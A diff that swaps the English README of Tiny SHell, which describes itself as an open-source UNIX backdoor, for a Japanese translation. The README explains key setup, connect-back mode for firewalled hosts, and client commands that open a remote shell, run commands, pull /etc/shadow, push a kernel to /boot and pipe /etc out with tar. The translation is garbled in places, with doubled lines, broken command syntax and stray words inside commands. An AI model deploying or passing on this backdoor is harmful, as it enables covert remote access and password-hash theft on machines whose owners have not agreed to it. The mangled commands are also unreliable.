@@ -1,73 +1,71 @@
+           Tiny SHell - オープンソースのUNIXバックドア
 
 
-                 Tiny SHell - An open-source UNIX backdoor
+    * Tiny SHellをコンパイルする前に
 
+        1. まず最初に、秘密鍵を設定する必要があります。
+           はtsh.hに配置されています。
+           鍵の長さは自由です(セキュリティを高めるために12文字以上)。
 
-    * Before compiling Tiny SHell
+        2. SERVER_PORT（サーバが着信を待つポート）を変更することをお勧めします。
+           を変更することをお勧めします。
 
-        1. First of all, you should setup your secret key, which
-           is located in tsh.h; the key can be of any length (use
-           at least 12 characters for better security).
+        3. ファイアウォールボックス上で動作する場合、tshdを「connect-back」モードで起動したい場合があります。
+           を「コネクトバック」モードで起動したい場合があります。
+           tsh.hのCONNECT_BACK_HOSTを変更します。
 
-        2. It is advised to change SERVER_PORT, the port on which
-           the server will be listening for incoming connections.
+    * Tiny SHellのコンパイル
 
-        3. You may want to start tshd in "connect-back" mode if
-           it runs on on a firewalled box; simply uncomment and
-           modify CONNECT_BACK_HOST in tsh.h.
+        make <system>" を実行します。ここで <system> は以下のいずれかになります：
+        Linux, freebsd, openbsd, netbsd, cygwin, sunos, irix, hpux, osf のどれかです。
 
-    * Compiling Tiny SHell
+    * サーバーの使用方法
 
-        Run "make <system>", where <system> can be any one of these:
-        linux, freebsd, openbsd, netbsd, cygwin, sunos, irix, hpux, osf
-
-    * How to use the server
-
-        It can be useful to set $HOME and the file creation mask
-        before starting the server:
+        サーバーを起動する前に、$HOMEとファイル作成マスクを設定しておくと便利です。
+        を設定しておくと便利です．
 
             % umask 077; HOME=/var/tmp ./tshd
 
-    * How to use the client
+    * クライアントの使用方法
 
-        Make sure tshd is running on the remote host. You can:
+        リモートホスト上でtshdが動作していることを確認します。できます：
+       
 
-        - start a shell:
+        - シェルを起動します：
 
-            ./tsh <hostname>
+            ./tsh <ホスト名
 
-        - execute a command:
+        - コマンドを実行します：
 
-            ./tsh <hostname> "uname -a"
+            ./tsh <ホスト名>"uname -a"
 
-        - transfer files:
+        - ファイルを転送する：
 
-            ./tsh <hostname> get /etc/shadow .
-            ./tsh <hostname> put vmlinuz /boot
+            ./tsh <ホスト名> get /etc/shadow .
+            ./tsh <ホスト名> put vmlinuz /ブート
 
-        Note: if the server runs in connect-back mode, replace
-        the remote machine hostname with "cb".
+        注：サーバーがコネクトバックモードで動作している場合、リモートマシンのホスト名を
+        リモートマシンのホスト名を "cb "に置き換えてください。
 
-    * About multiple file transfers
+    * 複数のファイル転送について
 
-        At the moment, Tiny SHell does not support scp-like multiple
-        and/or recursive file transfers. You can work around this bug
-        by simply making a tar archive and transferring it. Example:
+        現時点では、Tiny SHellはscpのような複数のファイル転送や再帰的なファイル転送をサポートしていません。
+        または再帰的なファイル転送をサポートしていません。このバグを回避するには
+        このバグを回避するために、単純にtarアーカイブを作成し、それを転送することができます。例を挙げます：
 
-        ./tsh host "stty raw; tar -cf - /etc 2>/dev/null" | tar -xvf -
+        ./tsh host "stty raw; tar -cf - /etc 2>/dev/null" | tar -xvf - 。
 
-    * About terminal modes
+    * ターミナルモードについて
 
-        On some brain-dead systems (actually, IRIX and HP-UX), Ctrl-C
-        and other control keys do not work correctly. Fix it with:
+        一部の脳死システム（実際にはIRIXとHP-UX）では、Ctrl-C
+        などのコントロールキーが正しく動作しないことがあります。で修正する：
 
-            % stty intr "^C" erase "^H" eof "^D" susp "^Z" kill "^U"
+            % stty intr "^C" erase "^H" eof "^D" susp "^Z" kill "^U" です。
 
-    * About security
+    * セキュリティについて
 
-        Please remember that the secret key is stored in clear inside
-        both tsh and tshd executables; therefore you should make sure
-        that no one except you has read access to these two files.
-        However, you may choose not to store the real (valid) key in
-        the client, which will then ask for a password when it starts.
-
+        秘密鍵は、tshとtshdの実行ファイルの内部でクリアに保存されることを忘れないでください。
+        秘密鍵はtshとtshdの実行ファイル内にクリアで保存されることを忘れないでください。
+        このため、この2つのファイルに対して、あなた以外の誰も読 み取りアクセスができないようにする必要があります。
+        しかし、本当の (有効な) 鍵をクライアントに保存しないようにすることもできます。
+        この場合、クライアントは起動時にパスワードを要求します。
